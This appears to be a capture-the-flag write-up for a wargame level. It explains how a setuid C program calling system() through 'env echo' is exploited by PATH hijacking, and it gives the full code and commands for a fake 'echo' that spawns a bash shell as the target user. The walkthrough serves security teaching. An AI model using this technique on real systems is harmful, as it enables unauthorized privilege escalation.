# level01

## Challenge info
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

```
int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

## Solution

The code has a vulnerability in the line (env variables "injection")</br>
```
system("(...) echo and now what?")
```

if we create a auxiliar program named echo that spawns a shell and place it into the PATH variable (before everything else that's there), we call the fake echo program, and spawn a shell under the euid of the program (flag01 user).

## auxiliar program
```
#include <stdio.h>
#include <stdlib.h>

void main(){
    system("/bin/bash");
}
```

compile it
```
gcc echo.c -o echo
```

export to PATH
```
export PATH="/tmp/:$PATH"
```

Now excute 
```
/home/flag01/flag01
getflag
```

## flag 
```
You have successfully executed getflag on a target account
```
